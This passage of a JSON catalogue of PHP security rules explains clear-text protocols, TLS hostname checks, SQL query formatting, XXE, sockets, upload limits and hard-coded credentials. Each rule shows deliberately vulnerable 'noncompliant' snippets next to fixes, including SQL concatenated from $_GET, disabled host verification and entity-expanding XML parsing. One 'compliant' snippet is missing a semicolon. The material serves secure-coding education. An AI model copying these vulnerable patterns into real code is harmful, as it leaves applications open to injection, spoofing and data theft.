        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n$url = \"http://example.com\"; // Sensitive\n$url = \"ftp://anonymous@example.com\"; // Sensitive\n$url = \"telnet://anonymous@example.com\"; // Sensitive\n\n$con = ftp_connect('example.com'); // Sensitive\n\n$trans = (new Swift_SmtpTransport('XXX', 1234)); // Sensitive\n\n$mailer = new PHPMailer(true); // Sensitive\n\ndefine( 'FORCE_SSL_ADMIN', false); // Sensitive\ndefine( 'FORCE_SSL_LOGIN', false); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$url = \"https://example.com\";\n$url = \"sftp://anonymous@example.com\";\n$url = \"ssh://anonymous@example.com\";\n\n$con = ftp_ssl_connect('example.com');\n\n$trans = (new Swift_SmtpTransport('smtp.example.org', 1234))\n  -&gt;setEncryption('tls')\n;\n\n$mailer = new PHPMailer(true);\n$mailer-&gt;SMTPSecure = 'tls';\n\ndefine( 'FORCE_SSL_ADMIN', true);\ndefine( 'FORCE_SSL_LOGIN', true);\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data Exposure\n  </a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/319\">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>\n  <li> <a href=\"https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html\">Google, Moving towards more secure web</a> </li>\n  <li> <a href=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/\">Mozilla, Deprecating non secure http</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html\">AWS Documentation</a> - Listeners\n  for your Application Load Balancers </li>\n  <li> <a href=\"https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html\">AWS\n  Documentation</a> - Stream Encryption </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5527": {
        "name": "Server hostnames should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability allows attackers to impersonate a trusted host.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them. In this\nprocess, the role of hostname validation, combined with certificate validation, is to ensure that a system is indeed the one it claims to be, adding\nan extra layer of trust and security.</p>\n<p>When hostname validation is disabled, the client skips this critical check. This creates an opportunity for attackers to pose as a trusted entity\nand intercept, manipulate, or steal the data being transmitted.</p>\n<p>To do so, an attacker would obtain a valid certificate authenticating <code>example.com</code>, serve it using a different hostname, and the\napplication code would still accept it.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable hostname validation, you are removing a key mechanism designed to build\nthis trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate hostnames, it cannot confirm the identity of the other party involved in the communication. An attacker can exploit\nthis by creating a fake server and masquerading it as a legitimate one. For example, they might set up a server that looks like your bank’s server,\ntricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect any data\nyour system sends to them, potentially leading to significant data breaches.</p>\n<h2>How to fix it in cURL</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled hostname validation.</p>\n<p>The hostname validation gets disabled by setting <code>CURLOPT_SSL_VERIFYHOST</code> to <code>0 or false</code>. To enable validation set the value\nto <code>2 or true</code> or do not set <code>CURLOPT_SSL_VERIFYHOST</code> at all to use the secure default value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$curl = curl_init();\ncurl_setopt($curl, CURLOPT_URL, 'https://example.com/');\ncurl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);  // Noncompliant\ncurl_exec($curl);\ncurl_close($curl);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$curl = curl_init();\ncurl_setopt($curl, CURLOPT_URL, 'https://example.com/');\ncurl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);\ncurl_exec($curl);\ncurl_close($curl);\n</pre>\n<h3>How does this work?</h3>\n<p>To fix the vulnerability of disabled hostname validation, it is strongly recommended to first re-enable the default validation and fix the root\ncause: the validity of the certificate.</p>\n<h4>Use valid certificates</h4>\n<p>If a hostname validation failure prevents connecting to the target server, keep in mind that <strong>one system’s code should not work around\nanother system’s problems</strong>, as this creates unnecessary dependencies and can lead to reliability issues.</p>\n<p>Therefore, the first solution is to change the remote host’s certificate to match its identity. If the remote host is not under your control,\nconsider replicating its service to a server whose certificate you can change yourself.</p>\n<p>In case the contacted host is located on a development machine, and if there is no other choice, try following this solution:</p>\n<ul>\n  <li> Create a self-signed certificate for that machine. </li>\n  <li> Add this self-signed certificate to the system’s trust store. </li>\n  <li> If the hostname is not <code>localhost</code>, add the hostname in the <code>/etc/hosts</code> file. </li>\n</ul>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/297\">CWE-297 - Improper Validation of Certificate with Host Mismatch</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S2077": {
        "name": "Formatting SQL queries is security-sensitive",
        "htmlDesc": "<p>Formatted SQL queries can be difficult to maintain, debug and can increase the risk of SQL injection when concatenating untrusted values into the\nquery. However, this rule doesn’t detect SQL injections (unlike rule <a href='/coding_rules#rule_key=php%3AS3649'>S3649</a>), the goal is only to highlight complex/formatted queries.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Some parts of the query come from untrusted values (like user inputs). </li>\n  <li> The query is repeated/duplicated in other parts of the code. </li>\n  <li> The application must support different types of relational databases. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html\">parameterized queries, prepared\n  statements, or stored procedures</a> and bind variables to SQL query parameters. </li>\n  <li> Consider using ORM frameworks if there is a need to have an abstract layer to access data. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n$id = $_GET['id'];\nmysql_connect('localhost', $username, $password) or die('Could not connect: ' . mysql_error());\nmysql_select_db('myDatabase') or die('Could not select database');\n\n$result = mysql_query(\"SELECT * FROM myTable WHERE id = \" . $id);  // Sensitive, could be susceptible to SQL injection\n\nwhile ($row = mysql_fetch_object($result)) {\n    echo $row-&gt;name;\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$id = $_GET['id'];\ntry {\n    $conn = new PDO('mysql:host=localhost;dbname=myDatabase', $username, $password);\n    $conn-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);\n\n    $stmt = $conn-&gt;prepare('SELECT * FROM myTable WHERE id = :id');\n    $stmt-&gt;execute(array('id' =&gt; $id));\n\n    while($row = $stmt-&gt;fetch(PDO::FETCH_OBJ)) {\n        echo $row-&gt;name;\n    }\n} catch(PDOException $e) {\n    echo 'ERROR: ' . $e-&gt;getMessage();\n}\n</pre>\n<h2>Exceptions</h2>\n<p>No issue will be raised if one of the functions is called with hard-coded string (no concatenation) and this string does not contain a \"$\"\nsign.</p>\n<pre>\n$result = mysql_query(\"SELECT * FROM myTable WHERE id = 42\") or die('Query failed: ' . mysql_error());  // Compliant\n</pre>\n<p>The current implementation does not follow variables. It will only detect SQL queries which are concatenated or contain a <code>$</code> sign\ndirectly in the function call.</p>\n<pre>\n$query = \"SELECT * FROM myTable WHERE id = \" . $id;\n$result = mysql_query($query);  // No issue will be raised even if it is Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/89\">CWE-89 - Improper Neutralization of Special Elements used in an SQL Command</a> </li>\n  <li> Derived from FindSecBugs rules <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JPA\">Potential SQL/JPQL Injection\n  (JPA)</a>, <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_JDO\">Potential SQL/JDOQL Injection (JDO)</a>, <a\n  href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#SQL_INJECTION_HIBERNATE\">Potential SQL/HQL Injection (Hibernate)</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S2755": {
        "name": "XML parsers should not be vulnerable to XXE attacks",
        "htmlDesc": "<p>This vulnerability allows the usage of external entities in XML.</p>\n<h2>Why is this an issue?</h2>\n<p>External Entity Processing allows for XML parsing with the involvement of external entities. However, when this functionality is enabled without\nproper precautions, it can lead to a vulnerability known as XML External Entity (XXE) attack.</p>\n<h3>What is the potential impact?</h3>\n<h4>Exposing sensitive data</h4>\n<p>One significant danger of XXE vulnerabilities is the potential for sensitive data exposure. By crafting malicious XML payloads, attackers can\nreference external entities that contain sensitive information, such as system files, database credentials, or configuration files. When these\nentities are processed during XML parsing, the attacker can extract the contents and gain unauthorized access to sensitive data. This poses a severe\nthreat to the confidentiality of critical information.</p>\n<h4>Exhausting system resources</h4>\n<p>Another consequence of XXE vulnerabilities is the potential for denial-of-service attacks. By exploiting the ability to include external entities,\nattackers can construct XML payloads that cause resource exhaustion. This can overwhelm the system’s memory, CPU, or other critical resources, leading\nto system unresponsiveness or crashes. A successful DoS attack can disrupt the availability of services and negatively impact the user experience.</p>\n<h4>Forging requests</h4>\n<p>XXE vulnerabilities can also enable Server-Side Request Forgery (SSRF) attacks. By leveraging the ability to include external entities, an attacker\ncan make the vulnerable application send arbitrary requests to other internal or external systems. This can result in unintended actions, such as\nretrieving data from internal resources, scanning internal networks, or attacking other systems. SSRF attacks can lead to severe consequences,\nincluding unauthorized data access, system compromise, or even further exploitation within the network infrastructure.</p>\n<h2>How to fix it in Core PHP</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of XML parsers that have external entity processing enabled. As a result, the parsers are vulnerable to XXE\nattacks if an attacker can control the XML file that is processed.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$xml = file_get_contents('xxe.xml');\n$doc = simplexml_load_string($xml, 'SimpleXMLElement', LIBXML_NOENT); // Noncompliant\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\n$doc = new DOMDocument();\n$doc-&gt;load('xxe.xml', LIBXML_NOENT); // Noncompliant\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\n$reader = new XMLReader();\n$reader-&gt;open('xxe.xml');\n$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, true); // Noncompliant\n</pre>\n<h4>Compliant solution</h4>\n<p>External entity substitution is disabled by default in <code>simplexml_load_string()</code> and <code>DOMDocument::open()</code>.</p>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$xml = file_get_contents('xxe.xml');\n$doc = simplexml_load_string($xml, 'SimpleXMLElement');\n</pre>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\n$doc = new DOMDocument();\n$doc-&gt;load('xxe.xml');\n</pre>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\n$reader = new XMLReader();\n$reader-&gt;open('xxe.xml');\n$reader-&gt;setParserProperty(XMLReader::SUBST_ENTITIES, false);\n</pre>\n<h3>How does this work?</h3>\n<h4>Disable external entities</h4>\n<p>The most effective approach to prevent XXE vulnerabilities is to disable external entity processing entirely, unless it is explicitly required for\nspecific use cases. By default, XML parsers should be configured to reject the processing of external entities. This can be achieved by setting the\nappropriate properties or options in your XML parser library or framework.</p>\n<p>If external entity processing is necessary for certain scenarios, adopt a whitelisting approach to restrict the entities that can be resolved\nduring XML parsing. Create a list of trusted external entities and disallow all others. This approach ensures that only known and safe entities are\nprocessed.<br> You should rely on features provided by your XML parser to restrict the external entities.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE)\">Top 10 2017 Category A4 - XML External\n  Entities (XXE)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/611\">CWE-611 - Information Exposure Through XML External Entity Reference</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/827\">CWE-827 - Improper Control of Document Type Definition</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S4818": {
        "name": "Using Sockets is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using sockets is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1785\">CVE-2011-178</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645\">CVE-2017-5645</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6597\">CVE-2018-6597</a> </li>\n</ul>\n<p>Sockets are vulnerable in multiple ways:</p>\n<ul>\n  <li> They enable a software to interact with the outside world. As this world is full of attackers it is necessary to check that they cannot receive\n  sensitive information or inject dangerous input. </li>\n  <li> The number of sockets is limited and can be exhausted. Which makes the application unresponsive to users who need additional sockets. </li>\n</ul>\n<p>This rules flags code that creates sockets. It matches only the direct use of sockets, not use through frameworks or high-level APIs such as the\nuse of http connections.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> sockets are created without any limit every time a user performs an action. </li>\n  <li> input received from sockets is used without being sanitized. </li>\n  <li> sensitive data is sent via sockets without being encrypted. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> In many cases there is no need to open a socket yourself. Use instead libraries and existing protocols. </li>\n  <li> Encrypt all data sent if it is sensitive. Usually it is better to encrypt it even if the data is not sensitive as it might change later. </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> any input read from the socket. </li>\n  <li> Limit the number of sockets a given user can create. Close the sockets as soon as possible. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nfunction handle_sockets($domain, $type, $protocol, $port, $backlog, $addr, $hostname, $local_socket, $remote_socket, $fd) {\n    socket_create($domain, $type, $protocol); // Sensitive\n    socket_create_listen($port, $backlog); // Sensitive\n    socket_addrinfo_bind($addr); // Sensitive\n    socket_addrinfo_connect($addr); // Sensitive\n    socket_create_pair($domain, $type, $protocol, $fd);\n\n    fsockopen($hostname); // Sensitive\n    pfsockopen($hostname); // Sensitive\n    stream_socket_server($local_socket); // Sensitive\n    stream_socket_client($remote_socket); // Sensitive\n    stream_socket_pair($domain, $type, $protocol); // Sensitive\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption ('Resource Exhaustion')</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/200\">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S5693": {
        "name": "Allowing requests with excessive content length is security-sensitive",
        "htmlDesc": "<p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in\norder to prevent DoS attacks.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> size limits are not defined for the different resources of the web application. </li>\n  <li> the web application is not protected by <a href=\"https://en.wikipedia.org/wiki/Rate_limiting\">rate limiting</a> features. </li>\n  <li> the web application infrastructure has limited resources. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For most of the features of an application, it is recommended to limit the size of requests to:\n    <ul>\n      <li> lower or equal to 8mb for file uploads. </li>\n      <li> lower or equal to 2mb for other requests. </li>\n    </ul>  </li>\n</ul>\n<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://symfony.com/doc/current/reference/constraints/File.html#maxsize\">Symfony Constraints</a>:</p>\n<pre>\nuse Symfony\\Component\\Validator\\Constraints as Assert;\nuse Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\nclass TestEntity\n{\n    public static function loadValidatorMetadata(ClassMetadata $metadata)\n    {\n        $metadata-&gt;addPropertyConstraint('upload', new Assert\\File([\n            'maxSize' =&gt; '100M', // Sensitive\n        ]));\n    }\n}\n</pre>\n<p>For <a href=\"https://laravel.com/docs/8.x/validation#rule-max\">Laravel Validator</a>:</p>\n<pre>\nuse App\\Http\\Controllers\\Controller;\nuse Illuminate\\Http\\Request;\n\nclass TestController extends Controller\n{\n    public function test(Request $request)\n    {\n        $validatedData = $request-&gt;validate([\n            'upload' =&gt; 'required|file', // Sensitive\n        ]);\n    }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://symfony.com/doc/current/reference/constraints/File.html#maxsize\">Symfony Constraints</a>:</p>\n<pre>\nuse Symfony\\Component\\Validator\\Constraints as Assert;\nuse Symfony\\Component\\Validator\\Mapping\\ClassMetadata;\n\nclass TestEntity\n{\n    public static function loadValidatorMetadata(ClassMetadata $metadata)\n    {\n        $metadata-&gt;addPropertyConstraint('upload', new Assert\\File([\n            'maxSize' =&gt; '8M', // Compliant\n        ]));\n    }\n}\n</pre>\n<p>For <a href=\"https://laravel.com/docs/8.x/validation#rule-max\">Laravel Validator</a>:</p>\n<pre>\nuse App\\Http\\Controllers\\Controller;\nuse Illuminate\\Http\\Request;\n\nclass TestController extends Controller\n{\n    public function test(Request $request)\n    {\n        $validatedData = $request-&gt;validate([\n            'upload' =&gt; 'required|file|max:8000', // Compliant\n        ]);\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Denial_of_Service_Cheat_Sheet.html\">Owasp Cheat Sheet</a> - Owasp Denial of Service\n  Cheat Sheet </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/770\">CWE-770 - Allocation of Resources Without Limits or Throttling</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S6437": {
        "name": "Credentials should not be hard-coded",
        "htmlDesc": "<p>Secret leaks often occur when a sensitive piece of authentication data is stored with the source code of an application. Considering the source\ncode is intended to be deployed across multiple assets, including source code repositories or application hosting servers, the secrets might get\nexposed to an unintended audience.</p>\n<h2>Why is this an issue?</h2>\n<p>In most cases, trust boundaries are violated when a secret is exposed in a source code repository or an uncontrolled deployment environment.\nUnintended people who don’t need to know the secret might get access to it. They might then be able to use it to gain unwanted access to associated\nservices or resources.</p>\n<p>The trust issue can be more or less severe depending on the people’s role and entitlement.</p>\n<h3>What is the potential impact?</h3>\n<p>The consequences vary greatly depending on the situation and the secret-exposed audience. Still, two main scenarios should be considered.</p>\n<h4>Financial loss</h4>\n<p>Financial losses can occur when a secret is used to access a paid third-party-provided service and is disclosed as part of the source code of\nclient applications. Having the secret, each user of the application will be able to use it without limit to use the third party service to their own\nneed, including in a way that was not expected.</p>\n<p>This additional use of the secret will lead to added costs with the service provider.</p>\n<p>Moreover, when rate or volume limiting is set up on the provider side, this additional use can prevent the regular operation of the affected\napplication. This might result in a partial denial of service for all the application’s users.</p>\n<h4>Application’s security downgrade</h4>\n<p>A downgrade can happen when the disclosed secret is used to protect security-sensitive assets or features of the application. Depending on the\naffected asset or feature, the practical impact can range from a sensitive information leak to a complete takeover of the application, its hosting\nserver or another linked component.</p>\n<p>For example, an application that would disclose a secret used to sign user authentication tokens would be at risk of user identity impersonation.\nAn attacker accessing the leaked secret could sign session tokens for arbitrary users and take over their privileges and entitlements.</p>\n<h2>How to fix it</h2>\n<p><strong>Revoke the secret</strong></p>\n<p>Revoke any leaked secrets and remove them from the application source code.</p>\n<p>Before revoking the secret, ensure that no other applications or processes are using it. Other usages of the secret will also be impacted when the\nsecret is revoked.</p>\n<p><strong>Analyze recent secret use</strong></p>\n<p>When available, analyze authentication logs to identify any unintended or malicious use of the secret since its disclosure date. Doing this will\nallow determining if an attacker took advantage of the leaked secret and to what extent.</p>\n<p>This operation should be part of a global incident response process.</p>\n<p><strong>Use a secret vault</strong></p>\n<p>A secret vault should be used to generate and store the new secret. This will ensure the secret’s security and prevent any further unexpected\ndisclosure.</p>\n<p>Depending on the development platform and the leaked secret type, multiple solutions are currently available.</p>\n<h3>Code examples</h3>\n<p>The following code example is noncompliant because it uses a hardcoded secret value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nuse Defuse\\Crypto\\KeyOrPassword;\n\nfunction createKey() {\n    $password = \"3xAmpl3\";  // Noncompliant\n    return KeyOrPassword::createFromPassword($password);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nuse Defuse\\Crypto\\KeyOrPassword;\n\nfunction createKey() {\n    $password = $_ENV[\"SECRET\"]\n    return KeyOrPassword::createFromPassword($password);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>While the noncompliant code example contains a hard-coded password, the compliant solution retrieves the secret’s value from its environment. This\nallows to have an environment-dependent secret value and avoids storing the password in the source code itself.</p>\n<p>Depending on the application and its underlying infrastructure, how the secret gets added to the environment might change.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> AWS Documentation - <a href=\"https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html\">What is AWS Secrets Manager</a> </li>\n  <li> Azure Documentation - <a href=\"https://learn.microsoft.com/en-us/azure/key-vault/\">Azure Key Vault</a> </li>\n  <li> Google Cloud - <a href=\"https://cloud.google.com/secret-manager/docs\">Secret Manager documentation</a> </li>\n  <li> HashiCorp Developer - <a href=\"https://developer.hashicorp.com/vault/docs\">Vault Documentation</a> </li>\n  <li> Symfony - <a href=\"https://symfony.com/doc/current/configuration/secrets.html\">How to Keep Sensitive Information Secret</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 - Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 - Category A2 - Broken\n  Authentication</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "php:S2070": {
        "name": "SHA-1 and Message-Digest hash algorithms should not be used in secure contexts",
